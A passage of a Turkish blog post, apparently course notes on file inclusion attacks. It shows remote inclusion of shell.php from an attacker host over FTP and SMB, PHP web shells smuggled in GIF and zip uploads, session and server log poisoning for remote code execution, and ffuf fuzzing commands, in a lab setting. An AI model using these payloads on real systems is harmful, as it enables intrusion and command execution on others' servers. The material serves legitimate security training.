+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m pyftpdlib -p 21</span><br><span class="line"></span><br><span class="line">[SNIP] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=23686 &lt;&lt;&lt;</span><br><span class="line">[SNIP] concurrency model: async</span><br><span class="line">[SNIP] masquerade (NAT) address: None</span><br><span class="line">[SNIP] passive ports: None</span><br></pre></td></tr></table></figure>
+
+<p>Güvenlik duvarı tarafından <code>http://</code> bloklanmış olabilir. FTP kullanmamızın amacı da işte bu bloklamayı aşmaktır. Çünkü bu sefer <code>ftp://</code> kullanıyor olacağız.</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2012.png" alt="Untitled"></p>
+<p>Burada PHP otomatik olarak varsayılan <strong>anonymous</strong> kullanıcısı ile giriş yapmaya çalışır. Eper spesifik bir ftp hesabı belirtmen gerekirse bunu cURL ile şu şekilde belirtebilirsin:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id&#x27;</span></span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p><strong><strong>SMB:</strong></strong> Eğer karşındaki bir windows sunucuysa hiç <code>allow_url_include</code> ile uğraşmana gerek kalmaz. Bunun nedeni, Windows’un uzak SMB sunucularındaki dosyaları, doğrudan bir UNC yolu ile erişilebilecek normal dosyalar olarak ele almasıdır.</p>
+<p><code>Impacket smbserver.py</code> kullanarak varsayılan olarak anonim girişi destekleyen sunucuyu çalıştıralım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver -smb2support share $(<span class="built_in">pwd</span>)</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>
+
+<p>Script’imizi UNC yoluna ekleyerek (<code>\\&lt;OUR_IP&gt;\shell.php</code>) ve bir komut belirterek (<code>&amp;cmd=whoami</code>) kullanabiliriz.</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\shell.php&amp;cmd=whoami</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2013.png" alt="Untitled"></p>
+<hr>
+<h2 id="LFI-and-File-Uploads"><a href="#LFI-and-File-Uploads" class="headerlink" title="LFI and File Uploads"></a><strong><strong>LFI and File Uploads</strong></strong></h2><p>Şimdi <strong>image upload</strong> yoluyla nasıl bu zafiyetten faydalanabileceğimizi öğrenelim. Öncelikle bir tane zararlı resim oluşturalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.gif</span><br></pre></td></tr></table></figure>
+
+<p>Sonrasında resmimizi yükleyelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2014.png" alt="Untitled"></p>
+<p>Resmin yüklendiği mesajını gördüğümüz sayfanın kaynak kodunu inceleyerek resmin hangi dizine yüklendiğini görelim:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/profile_images/shell.gif&quot;</span> <span class="attr">class</span>=<span class="string">&quot;profile-image&quot;</span> <span class="attr">id</span>=<span class="string">&quot;profile-image&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>GIF dosyamızın &#x2F;profile_images&#x2F; altına yüklendiğini gördük. Şimdi tek yapmamız gereken bu dosyaya erişmek. </p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2015.png" alt="Untitled"></p>
+<hr>
+<p>Bir diğer yöntem de <strong>zip wrapper</strong> kullanımıdır. Bir PHP web shell’i oluşturalım ve onu aşağıdaki gibi bir zip arşivine (shell.jpg adlı) sıkıştıralım :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php &amp;&amp; zip shell.jpg shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Once we upload the <code>shell.jpg</code> archive, we can include it with the <code>zip</code> wrapper as (<code>zip://shell.jpg</code>), and then refer to any files within it with <code>#shell.php</code> (URL encoded). Finally, we can execute commands as we always do with <code>&amp;cmd=id</code>, as follows:  </p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2016.png" alt="Untitled"></p>
+<hr>
+<h2 id="Log-Poisoning"><a href="#Log-Poisoning" class="headerlink" title="Log Poisoning"></a>Log Poisoning</h2><p>Sayfalarda cookie olarak <code>PHPSESSID</code> tutulduğu oluyor. Bu cookie değeri web sunucusunda bir yerlerde depolanmakta. Linux üzerinde <code>/var/lib/php/sessions/</code> , Windows üzerinde <code>C:\Windows\Temp\</code> dizinlerinde bu cookie’mize ait depolanan logları bulabiliriz. Bu log’un depolandığı dosya <code>sess_</code> ön ekini içerir ve şu şekilde bir örnek isimlendirmeye sahiptir: <code>sess_el4ukv0kqbvoirg7nkp4dncpk3</code>. Yani dosyamızın uzantısı şu şekilde belirtilebilir: <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code></p>
+<p>Şimdi bu dosyamızın içeriğini LFI açığı vasıtasıyla görüntüleyelim:</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2017.png" alt="Untitled"></p>
+<p>Preferences bizim kontrolümüzde olmasa da pages parametresi bizim kontrolümüzdedir ve bunu<br><code>?language=</code> parametresi vasıtasıyla kontrol edebiliriz. Yani buradaki page değeri aslında bizim<br><code>?language=</code> ’a girdiğimiz değerdir. Sayfamız ingilizce olduğu için bu parametrenin değeri en.php‘dir. O zaman bu arkadaşın değerini bir değiştirelim ve log dosyasında herhangi bir değişiklik oluyor mu görelim.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="tag">&lt;<span class="name">SERVER_IP</span>&gt;</span>:<span class="tag">&lt;<span class="name">PORT</span>&gt;</span>/index.php?language=session_poisoning</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi session dosyasını tekrardan dahil edelim ve değişim var mı görelim.</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2018.png" alt="Untitled"></p>
+<p>Page değerinin değiştiğini görebiliyoruz. Bu sefer en.php içermek yerine session_poisoning değerini içeriyor. <code>?language=</code> parametresine URL encode edilmiş basit bir web shell gönderelim:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="tag">&lt;<span class="name">SERVER_IP</span>&gt;</span>:<span class="tag">&lt;<span class="name">PORT</span>&gt;</span>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</span><br></pre></td></tr></table></figure>
+
+<p>Buradaki parametreye gönderilen değer <code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code> kodunun url encode edilmiş halidir. En sonunda cmd kısmına istediğimiz komutu girelim ve sonucu görüntüleyelim:</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2019.png" alt="Untitled"></p>
+<hr>
+<h2 id="Server-Log-Poisoning"><a href="#Server-Log-Poisoning" class="headerlink" title="Server Log Poisoning"></a>Server Log Poisoning</h2><p>Sunucular <code>access.log</code> ve <code>error.log</code> gibi dosyalar barındırırlar. Bu dosyalar sunucuya yapılan çeşitli istekleri bünyesinde barındırır ki buna istekte bulunan her kullanıcının User-Agent header’ini bulundurmak da dahildir. <strong>Nginx log’larını düşük yetki seviyesine sahip www-data gibi kullanıcılar okuyabilirken Apache’de ise log’ları yalnızca root gibi yüksek yetkili hesaplar okuyabilir.</strong> Bunun istisnası o sunucunun eksik ayarlamaya kurban gitmesi ya da eski olmasıdır. </p>
+<ul>
+<li>Apache<ul>
+<li>Windows: <code>C:\xampp\apache\logs\</code></li>
+<li>Linux: <code>/var/log/apache2/</code></li>
+</ul>
+</li>
+<li>Nginx<ul>
+<li>Windows: <code>C:\nginx\log\</code></li>
+<li>Linux: <code>/var/log/nginx/</code></li>
+</ul>
+</li>
+</ul>
+<p>Tabii farklı dizinlerde de olabilir bu dosyalar. O yüzden aşağıdaki listelerle fuzz’lama yapabilirsin.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">SecLists&#x2F;Fuzzing&#x2F;LFI at master · danielmiessler&#x2F;SecLists</a></p>
+<p><strong>Şimdi gidip log dosyamıza erişelim:</strong></p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2020.png" alt="Untitled"></p>
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Log değerleri devasa olduğu için istek gönderirken dikkatli olmakta fayda var. Neticede fazla yük bindirmek sistemi çökertebilir.</p>
+</div>
+
+<p>Şimdi Header değerimizi <code>Apache Log Poisoning</code> olarak ayarlayalım:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2021.png" alt="Untitled"></p>
+<p>Evet burayı değiştirebildiğimizi gördük. Şimdi buraya PHP kodumuzu yapıştıralım ve sonucu görelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2022.png" alt="Untitled"></p>
+<p>Şimdi log php koduna sahip olduğu için kod çalıştırılır ve biz RCE erişimi elde ederiz. Komutumuzu <code>?cmd=id</code> şeklinde belirtelim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2023.png" alt="Untitled"></p>
+<div class="note info flat"><p>🌐 <strong>Tip:</strong> The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, we can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code> files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
+</div>
+
+<p>Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:</p>
+<ul>
+<li><code>/var/log/sshd.log</code></li>
+<li><code>/var/log/mail</code></li>
+<li><code>/var/log/vsftpd.log</code></li>
+</ul>
+<p>We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the <code>ssh</code> or <code>ftp</code> services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the <code>mail</code> services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.</p>
+<hr>
+<h1 id="Otomatik-Saldiri-Fuzzlamasi"><a href="#Otomatik-Saldiri-Fuzzlamasi" class="headerlink" title="Otomatik Saldırı Fuzzlaması"></a>Otomatik Saldırı Fuzzlaması</h1><h2 id="Otomatik-Parametre-Fuzzlamasi"><a href="#Otomatik-Parametre-Fuzzlamasi" class="headerlink" title="Otomatik Parametre Fuzzlaması"></a>Otomatik Parametre Fuzzlaması</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u <span class="string">&#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#x27;</span> -fs 2287</span><br></pre></td></tr></table></figure>
+
+<p>Herhangi bir parametre belli olmadığı zaman parametre belirlemek amacıyla bu fuzz’lamadan faydalan.</p>
+<h2 id="Parametre-Bypass-Wordlist"><a href="#Parametre-Bypass-Wordlist" class="headerlink" title="Parametre Bypass Wordlist"></a>Parametre Bypass Wordlist</h2><p><code>/SecLists/Fuzzing/LFI/</code> içerisinde belirli payloadlar barındırmakta. Belirli parametreler üzerinde kullanılabilir. Örneğin:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u <span class="string">&#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#x27;</span> -fs 2287</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sunucu-Dosyalarini-Fuzzlama"><a href="#Sunucu-Dosyalarini-Fuzzlama" class="headerlink" title="Sunucu Dosyalarını Fuzzlama"></a>Sunucu Dosyalarını Fuzzlama</h2><p>Webroot bulmak o sunucunun root’a kadar olan dizinlerini saptamaktır. Yani sen şimdi index.php’ye referans edeceksin tamam da bu arkadaş nerede? Hangi dizinlerin içerisinde? Bunu saptamak için fuzz’lama yapılmasıdır.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u <span class="string">&#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#x27;</span> -fs 2287</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>Ufak Bir Vaka Çalışması:</strong></p>
+<p>Öncelikle parametreyi bilmediğim için parametre fuzz’laması yaptım ve <strong><code>view</code></strong> denilen bir parametrenin varlığını keşfettim:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2024.png" alt="Untitled"></p>
+<p>Ardından parametrenin kabul ettiği web root’u ya da okuyabileceği dosyaları bulabilmek adına parametre değeri fuzz’laması yaptım:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2025.png" alt="Untitled"></p>
+<p>Yukarıdaki değerleri alıp view parametresine gönderirsem bu o dosyaların içerisini okuyabileceğim manasına gelir. Benden &#x2F;flag.txt ‘yi okumamı istediği için ben de o değeri yolladım ve sonuç:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2026.png" alt="Untitled"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://fhk0.github.io">fhk0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://fhk0.github.io/2022/09/16/File-Inclusion/">https://fhk0.github.io/2022/09/16/File-Inclusion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg" data-sites="facebook, twitter, linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/09/16/Web-Attacks/"><img class="next-cover" src="/img/content-images/htb-academy/Web%20Attacks%20219f9e2baec741e9a0cba7f5c82486d5/webattacks.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Web Attacks</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mrrobot.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fhk0</div><div class="author-info__description">Web Application Pentester</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FHK0"><i class="fab fa-github"></i><span>Follow Me on GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://www.linkedin.com/in/firathilmikaplan/" target="_blank" title="Linkedin"><i class="fa-brands fa-linkedin"></i></a><a class="social-icon" href="https://medium.com/@fhk0" target="_blank" title="Medium"><i class="fa-brands fa-medium"></i></a><a class="social-icon" href="https://www.youtube.com/channel/UCik9LW_i9-h2NKVrs6180ng" target="_blank" title="YouTube"><i class="fa-brands fa-youtube"></i></a><a class="social-icon" href="https://www.hackerrank.com/fhk0x" target="_blank" title="HackerRank"><i class="fa-brands fa-hackerrank"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hey! I'm currently solving PortSwigger Labs. I'll share the solutions of them soon.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">1.</span> <span class="toc-text">Local File Inclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-Yontemleri"><span class="toc-number">2.</span> <span class="toc-text">Bypass Yöntemleri</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Non-Recursive-Path-Traversal-Filters"><span class="toc-number">2.1.</span> <span class="toc-text">Non-Recursive Path Traversal Filters</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Encoding"><span class="toc-number">2.2.</span> <span class="toc-text">Encoding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Approved-Paths"><span class="toc-number">2.3.</span> <span class="toc-text">Approved Paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Path-Truncation"><span class="toc-number">2.4.</span> <span class="toc-text">Path Truncation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Null-Bytes"><span class="toc-number">2.5.</span> <span class="toc-text">Null Bytes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Filters"><span class="toc-number">3.</span> <span class="toc-text">PHP Filters</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-Code-Execution"><span class="toc-number">4.</span> <span class="toc-text">Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Wrappers"><span class="toc-number">4.1.</span> <span class="toc-text">PHP Wrappers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Input-Wrapper"><span class="toc-number">4.1.1.</span> <span class="toc-text">Input Wrapper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expect-Wrapper"><span class="toc-number">4.1.2.</span> <span class="toc-text">Expect Wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-File-Inclusion-RFI"><span class="toc-number">4.2.</span> <span class="toc-text">Remote File Inclusion (RFI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution-with-RFI"><span class="toc-number">4.3.</span> <span class="toc-text">Remote Code Execution with RFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-and-File-Uploads"><span class="toc-number">4.4.</span> <span class="toc-text">LFI and File Uploads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log-Poisoning"><span class="toc-number">4.5.</span> <span class="toc-text">Log Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Log-Poisoning"><span class="toc-number">4.6.</span> <span class="toc-text">Server Log Poisoning</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Otomatik-Saldiri-Fuzzlamasi"><span class="toc-number">5.</span> <span class="toc-text">Otomatik Saldırı Fuzzlaması</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Otomatik-Parametre-Fuzzlamasi"><span class="toc-number">5.1.</span> <span class="toc-text">Otomatik Parametre Fuzzlaması</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Parametre-Bypass-Wordlist"><span class="toc-number">5.2.</span> <span class="toc-text">Parametre Bypass Wordlist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sunucu-Dosyalarini-Fuzzlama"><span class="toc-number">5.3.</span> <span class="toc-text">Sunucu Dosyalarını Fuzzlama</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Inclusion/" title="File Inclusion"><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Inclusion"/></a><div class="content"><a class="title" href="/2022/09/16/File-Inclusion/" title="File Inclusion">File Inclusion</a><time datetime="2022-09-16T05:24:50.000Z" title="Created 2022-09-16 08:24:50">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Web-Attacks/" title="Web Attacks"><img src="/img/content-images/htb-academy/Web%20Attacks%20219f9e2baec741e9a0cba7f5c82486d5/webattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/Web-Attacks/" title="Web Attacks">Web Attacks</a><time datetime="2022-09-16T05:24:41.000Z" title="Created 2022-09-16 08:24:41">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication"><img src="/img/content-images/htb-academy/Broken%20Authentication%2097c8a4f364d34faba8206ba43cd5143f/brokenauth.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Broken Authentication"/></a><div class="content"><a class="title" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication">Broken Authentication</a><time datetime="2022-09-16T05:24:30.000Z" title="Created 2022-09-16 08:24:30">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing"><img src="/img/content-images/htb-academy/Login%20Brute%20Forcing%20e7d1108ee8b549c085496b59363951fd/loginbruteforcing.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Login Brute Forcing"/></a><div class="content"><a class="title" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing">Login Brute Forcing</a><time datetime="2022-09-16T05:24:17.000Z" title="Created 2022-09-16 08:24:17">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks"><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Upload Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks">File Upload Attacks</a><time datetime="2022-09-16T05:24:05.000Z" title="Created 2022-09-16 08:24:05">2022-09-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By fhk0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,0" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
